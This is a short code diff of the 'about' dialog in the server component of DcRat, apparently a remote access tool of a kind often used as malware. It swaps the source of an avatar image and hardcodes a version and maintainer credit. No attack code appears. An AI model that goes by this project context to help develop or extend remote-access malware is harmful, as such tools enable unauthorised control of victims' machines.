@@ -61,7 +61,7 @@ namespace Server.Forms
             // pictureBox1
             // 
             this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Left;
-            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Image = global::Server.Properties.Resources.avatar1;
             this.pictureBox1.Location = new System.Drawing.Point(0, 0);
             this.pictureBox1.MaximumSize = new System.Drawing.Size(256, 256);
             this.pictureBox1.Name = "pictureBox1";
@@ -83,7 +83,7 @@ namespace Server.Forms
             this.richTextBox1.ShortcutsEnabled = false;
             this.richTextBox1.Size = new System.Drawing.Size(346, 256);
             this.richTextBox1.TabIndex = 1;
-            this.richTextBox1.Text = $"\n{Server.Settings.Version}\n\nCurrent Maintainer: Choomai\n\nAll credits go to qwqdanchun " +
+            this.richTextBox1.Text = "\nDcRat v1.0.9-choomai\n\nCurrent Maintainer: Choomai\n\nAll credits go to qwqdanchun " +
     "as the original developer of DcRat\n";
             this.richTextBox1.ZoomFactor = 1.101F;
             // 
